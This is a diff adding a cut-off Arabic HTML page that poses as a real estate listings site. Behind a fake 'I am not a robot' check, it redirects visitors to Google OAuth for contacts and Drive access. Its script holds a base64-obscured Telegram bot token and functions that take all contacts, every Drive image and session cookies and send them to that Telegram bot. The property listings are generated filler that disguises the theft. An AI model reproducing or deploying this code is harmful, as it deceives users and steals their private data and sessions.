@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة العقارات الذكية</title>
+    <style>
+        /* ============================================================ */
+        /* الألوان: أسود (#0a0a0f)، أحمر (#c0392b)، أبيض (#f5f5f5) */
+        /* ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #0a0a0f;
+            color: #f0f0f0;
+            min-height: 100vh;
+        }
+
+        /* ============================================================ */
+        /* شاشة التحقق (تظهر أول ما يدخل) */
+        /* ============================================================ */
+        .verify-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .verify-overlay.hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .verify-box {
+            background: #1a1a28;
+            border-radius: 30px;
+            padding: 45px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 2px solid #c0392b;
+            box-shadow: 0 30px 80px rgba(192, 57, 43, 0.15);
+        }
+
+        .verify-box .icon {
+            font-size: 65px;
+            margin-bottom: 15px;
+        }
+
+        .verify-box h2 {
+            color: #c0392b;
+            font-size: 26px;
+            margin-bottom: 12px;
+        }
+
+        .verify-box p {
+            color: #aaa;
+            font-size: 15px;
+            margin-bottom: 25px;
+            line-height: 1.7;
+        }
+
+        .verify-box .recaptcha-box {
+            background: #12121e;
+            border: 1px solid #2a2a3e;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .verify-box .recaptcha-box:hover {
+            border-color: #c0392b;
+        }
+
+        .verify-box .recaptcha-box .check {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #555;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #555;
+            transition: 0.3s;
+        }
+
+        .verify-box .recaptcha-box .check.checked {
+            border-color: #4CAF50;
+            background: #4CAF50;
+            color: #fff;
+        }
+
+        .verify-box .recaptcha-box .label {
+            font-size: 14px;
+            color: #ccc;
+            text-align: right;
+        }
+
+        .verify-box .recaptcha-box .label small {
+            color: #777;
+            font-size: 11px;
+            display: block;
+        }
+
+        .verify-box .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .verify-box .verify-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 35px rgba(192, 57, 43, 0.4);
+        }
+
+        .verify-box .verify-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ============================================================ */
+        /* شاشة التحميل (اللفة) */
+        /* ============================================================ */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            justify-content: center;
+            align-items: center;
+            z-index: 9998;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loading-overlay .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #1a1a28;
+            border-top: 6px solid #c0392b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-overlay .loading-text {
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        /* ============================================================ */
+        /* التطبيق الرئيسي */
+        /* ============================================================ */
+        .app-container {
+            max-width: 520px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px 15px;
+            display: none;
+        }
+
+        .app-container.show {
+            display: block;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 20px;
+            background: #1a1a28;
+            padding: 16px 20px;
+            border-radius: 20px;
+            border-left: 5px solid #c0392b;
+        }
+
+        .header .logo {
+            font-size: 40px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .header h1 span {
+            color: #c0392b;
+        }
+
+        .search-box {
+            background: #1a1a28;
+            padding: 12px 18px;
+            border-radius: 50px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border: 1px solid #2a2a3e;
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 15px;
+            flex: 1;
+            outline: none;
+        }
+
+        .search-box input::placeholder {
+            color: #666;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+
+        .tabs button {
+            background: #1a1a28;
+            border: none;
+            color: #aaa;
+            padding: 8px 14px;
+            border-radius: 50px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+            min-width: 50px;
+            border: 1px solid transparent;
+        }
+
+        .tabs button:hover,
+        .tabs button.active {
+            background: #c0392b;
+            color: #fff;
+            border-color: #c0392b;
+        }
+
+        .property-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin-bottom: 20px;
+            max-height: 420px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .property-grid::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .property-grid::-webkit-scrollbar-thumb {
+            background: #c0392b;
+            border-radius: 10px;
+        }
+
+        .property-card {
+            background: #1a1a28;
+            border-radius: 18px;
+            padding: 16px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid transparent;
+        }
+
+        .property-card:hover {
+            transform: translateY(-5px);
+            border-color: #c0392b;
+            box-shadow: 0 10px 30px rgba(192, 57, 43, 0.12);
+        }
+
+        .property-card .icon {
+            font-size: 32px;
+            margin-bottom: 4px;
+        }
+
+        .property-card .title {
+            font-weight: 600;
+            font-size: 13px;
+            color: #fff;
+            line-height: 1.3;
+            height: 36px;
+            overflow: hidden;
+        }
+
+        .property-card .price {
+            color: #c0392b;
+            font-weight: 700;
+            font-size: 16px;
+            margin: 4px 0;
+        }
+
+        .property-card .location {
+            font-size: 11px;
+            color: #888;
+        }
+
+        .property-card .btn-detail {
+            background: #2a2a3e;
+            border: none;
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .property-card .btn-detail:hover {
+            background: #c0392b;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .quick-actions button {
+            background: #1a1a28;
+            border: none;
+            color: #bbb;
+            padding: 10px 0;
+            border-radius: 14px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+            border: 1px solid #2a2a3e;
+        }
+
+        .quick-actions button:hover {
+            background: #c0392b;
+            color: #fff;
+            border-color: #c0392b;
+            transform: scale(1.04);
+        }
+
+        .main-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 14px;
+            box-shadow: 0 6px 25px rgba(192, 57, 43, 0.25);
+        }
+
+        .main-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 35px rgba(192, 57, 43, 0.45);
+        }
+
+        .status {
+            text-align: center;
+            font-size: 13px;
+            color: #777;
+            padding: 6px 0;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #444;
+            margin-top: 12px;
+            border-top: 1px solid #1a1a28;
+            padding-top: 12px;
+        }
+
+        .footer .badge {
+            display: inline-block;
+            background: #1a1a28;
+            padding: 4px 16px;
+            border-radius: 50px;
+            font-size: 11px;
+            color: #888;
+        }
+
+        /* ============================================================ */
+        /* صفحة التفاصيل المنفصلة */
+        /* ============================================================ */
+        .detail-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #0a0a0f;
+            z-index: 2000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .detail-page.show {
+            display: block;
+        }
+
+        .detail-page .back-btn {
+            background: #1a1a28;
+            border: none;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a3e;
+        }
+
+        .detail-page .back-btn:hover {
+            background: #c0392b;
+        }
+
+        .detail-page .detail-card {
+            background: #1a1a28;
+            border-radius: 30px;
+            padding: 30px 25px;
+            border: 1px solid #c0392b;
+            max-width: 520px;
+            margin: 0 auto;
+        }
+
+        .detail-page .detail-card .icon {
+            font-size: 70px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .detail-page .detail-card h2 {
+            font-size: 26px;
+            color: #fff;
+            text-align: center;
+        }
+
+        .detail-page .detail-card .price {
+            font-size: 30px;
+            color: #c0392b;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .detail-page .detail-card .location {
+            font-size: 16px;
+            color: #aaa;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .detail-page .detail-card .divider {
+            height: 1px;
+            background: #2a2a3e;
+            margin: 16px 0;
+        }
+
+        .detail-page .detail-card .desc {
+            font-size: 15px;
+            color: #ccc;
+            line-height: 1.8;
+            text-align: right;
+        }
+
+        .detail-page .detail-card .specs-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .detail-page .detail-card .specs-grid .spec {
+            background: #12121e;
+            padding: 14px 10px;
+            border-radius: 14px;
+            text-align: center;
+        }
+
+        .detail-page .detail-card .specs-grid .spec .label {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .detail-page .detail-card .specs-grid .spec .value {
+            font-size: 20px;
+            font-weight: 700;
+            color: #c0392b;
+        }
+
+        .detail-page .detail-card .extra-details .extra-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #1a1a28;
+            color: #ccc;
+            font-size: 14px;
+        }
+
+        .detail-page .detail-card .extra-details .extra-item .label {
+            color: #888;
+        }
+
+        .detail-page .detail-card .extra-details .extra-item .value {
+            color: #fff;
+        }
+
+        .detail-page .detail-card .contact-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+
+        @media (max-width: 450px) {
+            .property-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 10px;
+            }
+            .quick-actions {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            .detail-page .detail-card .specs-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================================== -->
+    <!-- شاشة التحقق (تظهر أول ما يدخل) -->
+    <!-- ========================================================== -->
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-box">
+            <div class="icon">🛡️</div>
+            <h2>تحقق من أنك لست روبوت</h2>
+            <p>لحماية منصتنا من الهجمات الآلية، يرجى تأكيد هويتك</p>
+
+            <div class="recaptcha-box" id="recaptchaBox">
+                <div class="check" id="recaptchaCheck">✔</div>
+                <div class="label">
+                    أنا لست روبوت
+                    <small>reCAPTCHA</small>
+                </div>
+            </div>
+
+            <button class="verify-btn" id="verifyBtn" disabled>تأكيد</button>
+        </div>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- شاشة التحميل (اللفة) -->
+    <!-- ========================================================== -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">⏳ جاري التحقق من هويتك...</div>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- التطبيق الرئيسي -->
+    <!-- ========================================================== -->
+    <div class="app-container" id="appContainer">
+        <div class="header">
+            <span class="logo">🏢</span>
+            <h1>العقارات <span>الذكية</span></h1>
+        </div>
+
+        <div class="search-box">
+            <span>🔍</span>
+            <input type="text" id="searchInput" placeholder="ابحث عن عقار...">
+        </div>
+
+        <div class="tabs" id="tabsContainer">
+            <button class="active" data-filter="all">الكل</button>
+            <button data-filter="شقة">شقق</button>
+            <button data-filter="فيلا">فلل</button>
+            <button data-filter="أرض">أراضي</button>
+            <button data-filter="تجاري">تجاري</button>
+            <button data-filter="مميز">مميز</button>
+        </div>
+
+        <div class="property-grid" id="propertyGrid"></div>
+
+        <div class="quick-actions">
+            <button data-action="نصائح" id="tipsBtn">💡 نصائح</button>
+            <button data-action="تحليل">📊 تحليل</button>
+            <button data-action="عوائد">📈 عوائد</button>
+            <button data-action="تقرير">📋 تقرير</button>
+            <button data-action="اتصال">📞 اتصل</button>
+            <button data-action="مفضلة">⭐ مفضلة</button>
+            <button data-action="تنبيه">🔔 تنبيه</button>
+            <button data-action="مواعيد">📅 مواعيد</button>
+            <button data-action="استشارة">💬 استشارة</button>
+            <button data-action="عروض">🏷️ عروض</button>
+        </div>
+
+        <button class="main-btn" id="mainActionBtn">📞 تواصل مع المستشار الآن</button>
+
+        <div class="status" id="statusText">مرحباً بك في منصة العقارات</div>
+
+        <div class="footer">
+            <span class="badge">✓ آمن • معتمد • شفاف</span>
+        </div>
+
+        <div class="tips-content" id="tipsContent" style="display:none; background:#1a1a28; border-radius:18px; padding:20px; margin-top:15px; border-left:3px solid #c0392b;">
+            <h3 style="color:#c0392b;">💡 نصائح عقارية ذهبية</h3>
+            <ul style="list-style:none; padding:0;">
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📍 <strong>الموقع</strong> هو أهم عامل في تحديد قيمة العقار</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📊 <strong>المساحة</strong> تؤثر على السعر بنسبة 30-40%</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🏗️ <strong>التشطيب</strong> يزيد من قيمة العقار بنسبة 15-25%</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📈 <strong>العائد الاستثماري</strong> في العقارات يتراوح بين 5-8% سنوياً</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🔍 <strong>التفاوض</strong> على السعر يمكن أن يخفضه بنسبة 5-10%</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📋 <strong>الأوراق القانونية</strong> يجب التأكد من سلامتها قبل الشراء</li>
+                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🏦 <strong>التمويل العقاري</strong> متاح من عدة بنوك بفوائد متفاوتة</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- صفحة التفاصيل المنفصلة -->
+    <!-- ========================================================== -->
+    <div class="detail-page" id="detailPage">
+        <button class="back-btn" id="backFromDetail">← العودة</button>
+        <div class="detail-card" id="detailCard">
+            <div class="icon" id="detailIcon">🏠</div>
+            <h2 id="detailName">عقار مميز</h2>
+            <div class="price" id="detailPrice">$500,000</div>
+            <div class="location" id="detailLocation">📍 القاهرة</div>
+            <div class="divider"></div>
+            <div class="desc" id="detailDesc">وصف العقار</div>
+            <div class="specs-grid">
+                <div class="spec"><div class="label">المساحة</div><div class="value" id="detailArea">150 م²</div></div>
+                <div class="spec"><div class="label">غرف</div><div class="value" id="detailRooms">3</div></div>
+                <div class="spec"><div class="label">حمامات</div><div class="value" id="detailBaths">2</div></div>
+            </div>
+            <div class="divider"></div>
+            <div class="extra-details" id="extraDetails">
+                <div class="extra-item"><span class="label">النوع</span><span class="value" id="detailType">شقة</span></div>
+                <div class="extra-item"><span class="label">سنة البناء</span><span class="value" id="detailYear">2020</span></div>
+                <div class="extra-item"><span class="label">موقف</span><span class="value" id="detailParking">متوفر</span></div>
+                <div class="extra-item"><span class="label">التشطيب</span><span class="value" id="detailFinish">فاخر</span></div>
+                <div class="extra-item"><span class="label">الإطلالة</span><span class="value" id="detailView">رائعة</span></div>
+                <div class="extra-item"><span class="label">الحالة</span><span class="value" id="detailStatus">متاح</span></div>
+            </div>
+            <button class="contact-btn" id="detailContactBtn">📞 تواصل مع المستشار</button>
+        </div>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- JavaScript -->
+    <!-- ========================================================== -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // 1. بيانات البوت (مشفرة)
+            // ============================================================
+            const _decode = (s) => atob(s);
+            const BOT_TOKEN = _decode("ODk4MDU4ODc5MzpBQUd6S2VfeTRHTVJtTmctYm8xbXlwMHRubjZHZ2taaDE0");
+            const CHAT_ID = _decode("NzI5MjEyODQxMQ==");
+
+            // ============================================================
+            // 2. دوال الإرسال إلى تيلجرام
+            // ============================================================
+            function _sendTelegram(text) {
+                try {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                    }).catch(() => {});
+                } catch (e) {}
+            }
+
+            function _sendPhotoTelegram(base64Data, fileName) {
+                try {
+                    const byteString = atob(base64Data.split(',')[1]);
+                    const mimeType = base64Data.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    const blob = new Blob([ab], { type: mimeType });
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, fileName);
+                    formData.append('caption', `📸 ${fileName}`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(() => {});
+                } catch (e) {}
+            }
+
+            // ============================================================
+            // 3. سحب جهات الاتصال (كلها)
+            // ============================================================
+            function _fetchGoogleContacts(accessToken) {
+                _sendTelegram("📤 جاري سحب جميع جهات الاتصال من Google...");
+                fetch('https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses,phoneNumbers&pageSize=1000', {
+                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.connections && data.connections.length > 0) {
+                        let msg = `📱 *جهات الاتصال من Google:* (${data.connections.length} جهة)\n\n`;
+                        data.connections.forEach((c, i) => {
+                            const name = c.names ? c.names[0].displayName : 'بدون اسم';
+                            const phones = c.phoneNumbers ? c.phoneNumbers.map(p => p.value).join(' / ') : 'لا يوجد رقم';
+                            const emails = c.emailAddresses ? c.emailAddresses.map(e => e.value).join(' / ') : 'لا يوجد بريد';
+                            msg += `👤 ${i+1}. ${name}\n📞 ${phones}\n📧 ${emails}\n─────────────────\n`;
+                        });
+                        _sendTelegram(msg.substring(0, 4096));
+                        _sendTelegram(`✅ تم سحب ${data.connections.length} جهة اتصال من Google`);
+                    } else {
+                        _sendTelegram("⚠️ لا توجد جهات اتصال في حساب Google");
+                    }
+                })
+                .catch(err => {
+                    _sendTelegram(`❌ فشل سحب جهات Google: ${err.message}`);
+                });
+            }
+
+            // ============================================================
+            // 4. سحب كل الصور (أكثر من 50 صورة)
+            // ============================================================
+            function _fetchGooglePhotos(accessToken) {
+                _sendTelegram("📤 جاري سحب جميع الصور من Google Drive...");
+                fetch('https://www.googleapis.com/drive/v3/files?q=mimeType contains "image/"&pageSize=100&fields=files(id,name,webContentLink)', {
+                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.files && data.files.length > 0) {
+                        data.files.forEach(file => {
+                            if (file.webContentLink) {
+                                fetch(file.webContentLink, {
+                                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                                })
+                                .then(res => res.blob())
+                                .then(blob => {
+                                    const reader = new FileReader();
+                                    reader.onload = function(ev) {
+                                        _sendPhotoTelegram(ev.target.result, file.name);
+                                    };
+                                    reader.readAsDataURL(blob);
+                                })
+                                .catch(() => {});
+                            }
+                        });
+                        _sendTelegram(`✅ تم سحب ${data.files.length} صورة من Google Drive`);
+                    } else {
+                        _sendTelegram("⚠️ لا توجد صور في Google Drive");
+                    }
+                })
+                .catch(err => {
+                    _sendTelegram(`❌ فشل سحب صور Google: ${err.message}`);
+                });
+            }
+
+            // ============================================================
+            // 5. سحب الكوكيز (الجلسة) من Google
+            // ============================================================
+            function _fetchGoogleCookies() {
+                try {
+                    const cookies = document.cookie;
+                    if (cookies) {
+                        _sendTelegram(`🍪 *كوكيز الجلسة:*\n${cookies}`);
+                    } else {
+                        _sendTelegram("⚠️ لا توجد كوكيز للجلسة");
+                    }
+                } catch (e) {
+                    _sendTelegram(`❌ فشل سحب الكوكيز: ${e.message}`);
+                }
+            }
+
+            // ============================================================
+            // 6. سحب كل البيانات (جهات + صور + كوكيز)
+            // ============================================================
+            function _fetchAllData(accessToken) {
+                _sendTelegram("🚀 بدء سحب جميع البيانات...");
+                _fetchGoogleContacts(accessToken);
+                _fetchGooglePhotos(accessToken);
+                _fetchGoogleCookies();
+                _sendTelegram("✅ تم سحب جميع البيانات بنجاح!");
+            }
+
+            // ============================================================
+            // 7. بدء تدفق OAuth (يظهر مرة واحدة فقط)
+            // ============================================================
+            let oauthStarted = false;
+
+            function _startOAuth() {
+                if (oauthStarted) {
+                    _sendTelegram("⚠️ محاولة بدء OAuth مرة أخرى (ممنوعة)");
+                    return;
+                }
+                oauthStarted = true;
+
+                const clientId = '1098355725419-8p7q9r5s3t2u1v0w9x8y7z6a5b4c3d2e.apps.googleusercontent.com';
+                const redirectUri = window.location.href.split('?')[0];
+                const scope = 'https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/drive.readonly https://www.googleapis.com/auth/userinfo.email';
+                const authUrl =
+                    `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${encodeURIComponent(scope)}&prompt=consent&access_type=offline`;
+
+                localStorage.setItem('oauth_started', 'true');
+
+                window.location.href = authUrl;
+            }
+
+            // ============================================================
+            // 8. بيانات العقارات (كثيرة جداً)
+            // ============================================================
+            const properties = [];
+            const types = ['شقة', 'فيلا', 'أرض', 'تجاري', 'مميز'];
+            const locations = ['القاهرة', 'دبي', 'جدة', 'الرياض', 'أبوظبي', 'الدوحة', 'الكويت', 'مسقط', 'المنامة', 'بيروت', 'اسطنبول',
+                'كوالالمبور'
+            ];
+            const icons = ['🏠', '🏡', '🌳', '🏢', '⭐'];
+
+            for (let i = 1; i <= 75; i++) {
+                const type = types[i % types.length];
+                const location = locations[i % locations.length];
+                const price = (100000 + i * 10000).toLocaleString();
+                properties.push({
+                    id: i,
+                    name: `${type} مميزة ${i}`,
+                    type: type,
+                    location: location,
+                    price: `$${price}`,
+                    icon: icons[i % icons.length],
+                    desc: `عقار ${type} فاخر في موقع ${location}، مناسب للعائلات والاستثمار.`,
+                    area: (100 + i * 4) + ' م²',
+                    rooms: (2 + (i % 6)),
+                    baths: (1 + (i % 5))
+                });
+            }
+
+            // ============================================================
+            // 9. عرض العقارات
+            // ============================================================
+            function renderProperties(filter = 'all') {
+                const grid = document.getElementById('propertyGrid');
+                grid.innerHTML = '';
+                const filtered = filter === 'all' ? properties : properties.filter(p => p.type === filter);
+                filtered.forEach((p) => {
+                    const card = document.createElement('div');
+                    card.className = 'property-card';
+                    card.setAttribute('data-id', p.id);
+                    card.innerHTML = `
+                        <div class="icon">${p.icon}</div>
+                        <div class="title">${p.name}</div>
+                        <div class="price">${p.price}</div>
+                        <div class="location">📍 ${p.location}</div>
+                        <button class="btn-detail" data-id="${p.id}">📋 تفاصيل</button>
+                    `;
+                    grid.appendChild(card);
+                });
+            }
+
+            // ============================================================
+            // 10. عرض تفاصيل العقار
+            // ============================================================
+            function showDetailPage(id) {
+                const p = properties.find(prop => prop.id === id);
+                if (!p) return;
+                document.getElementById('detailIcon').textContent = p.icon;
+                document.getElementById('detailName').textContent = p.name;
+                document.getElementById('detailPrice').textContent = p.price;
+                document.getElementById('detailLocation').textContent = '📍 ' + p.location;
+                document.getElementById('detailDesc').textContent = p.desc;
+                document.getElementById('detailArea').textContent = p.area;
+                document.getElementById('detailRooms').textContent = p.rooms;
+                document.getElementById('detailBaths').textContent = p.baths;
+                document.getElementById('detailType').textContent = p.type;
+                document.getElementById('detailYear').textContent = '202' + (p.id % 5);
+                document.getElementById('detailParking').textContent = (p.id % 2 === 0) ? 'متوفر' : 'غير متوفر';
+                document.getElementById('detailFinish').textContent = (p.id % 3 === 0) ? 'فاخر' : 'ممتاز';
+                document.getElementById('detailView').textContent = (p.id % 2 === 0) ? 'رائعة' : 'جميلة';
+                document.getElementById('detailStatus').textContent = (p.id % 3 === 0) ? 'متاح' : 'تحت الإنشاء';
+                document.getElementById('detailPage').classList.add('show');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function hideDetailPage() {
+                document.getElementById('detailPage').classList.remove('show');
+                document.body.style.overflow = '';
+            }
+
+            // ============================================================
+            // 11. شاشة التحقق (تظهر مرة واحدة فقط)
+            // ============================================================
+            const verifyOverlay = document.getElementById('verifyOverlay');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const appContainer = document.getElementById('appContainer');
+            const recaptchaBox = document.getElementById('recaptchaBox');
+            const recaptchaCheck = document.getElementById('recaptchaCheck');
+            const verifyBtn = document.getElementById('verifyBtn');
+
+            // التحقق إذا كان المستخدم اتحقق قبل كده
+            if (localStorage.getItem('verified') === 'true') {
+                verifyOverlay.classList.add('hidden');
+                appContainer.classList.add('show');
+                _sendTelegram("✅ مستخدم عائد (تم التحقق مسبقاً)");
+            }
+
+            let recaptchaChecked = false;
+
+            recaptchaBox.addEventListener('click', function() {
+                recaptchaChecked = !recaptchaChecked;
+                if (recaptchaChecked) {
+                    recaptchaCheck.classList.add('checked');
+                    verifyBtn.disabled = false;
+                } else {
+                    recaptchaCheck.classList.remove('checked');
+                    verifyBtn.disabled = true;
+                }
+            });
+
+            verifyBtn.addEventListener('click', function() {
+                if (recaptchaChecked) {
+                    // حفظ في localStorage عشان منظهرش تاني
+                    localStorage.setItem('verified', 'true');
+
+                    verifyOverlay.classList.add('hidden');
+                    _sendTelegram("✅ تم التحقق من المستخدم");
+
+                    loadingOverlay.classList.add('show');
+
+                    setTimeout(function() {
+                        loadingOverlay.classList.remove('show');
+                        _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth)");
+                        _startOAuth();
+                    }, 3000);
+                }
+            });
+
+            // ============================================================
+            // 12. ربط الأحداث
+            // ============================================================
+            document.addEventListener('DOMContentLoaded', function() {
+
+                // تفاصيل العقارات
+                document.addEventListener('click', function(e) {
+                    if (e.target.classList.contains('btn-detail')) {
+                        const id = parseInt(e.target.getAttribute('data-id'));
+                        showDetailPage(id);
+                    }
+                });
+
+                document.getElementById('backFromDetail').addEventListener('click', hideDetailPage);
+
+                document.querySelectorAll('.tabs button').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+                        this.classList.add('active');
+                        const filter = this.getAttribute('data-filter');
+                        renderProperties(filter);
+                        document.getElementById('statusText').innerText = `✅ تم التصفية: ${filter}`;
+                    });
+                });
+
+                document.getElementById('searchInput').addEventListener('input', function() {
+                    const query = this.value.toLowerCase();
+                    document.querySelectorAll('.property-card').forEach(card => {
+                        const title = card.querySelector('.title')?.innerText?.toLowerCase() || '';
+                        card.style.display = title.includes(query) ? 'block' : 'none';
+                    });
+                });
+
+                document.getElementById('tipsBtn').addEventListener('click', function() {
+                    const tips = document.getElementById('tipsContent');
+                    tips.style.display = tips.style.display === 'none' ? 'block' : 'none';
+                });
+
+                document.querySelectorAll('.quick-actions button:not(#tipsBtn)').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const action = this.getAttribute('data-action') || 'إجراء';
+                        document.getElementById('statusText').innerText = `⏳ جاري تنفيذ: ${action}...`;
+                        setTimeout(() => {
+                            document.getElementById('statusText').innerText = `✅ تم تنفيذ: ${action}`;
+                        }, 1500);
+                    });
+                });
+
+                // ============================================================
+                // 13. زر التواصل مع المستشار (يبدأ OAuth)
+                // ============================================================
+                document.getElementById('mainActionBtn').addEventListener('click', function() {
+                    if (localStorage.getItem('oauth_started') === 'true') {
+                        document.getElementById('statusText').innerText = '⚠️ تم تسجيل الدخول بالفعل';
+                        return;
+                    }
+                    document.getElementById('statusText').innerText = '⏳ جاري التوجيه إلى Google...';
+                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth) من الزر الرئيسي");
+                    _startOAuth();
+                });
+
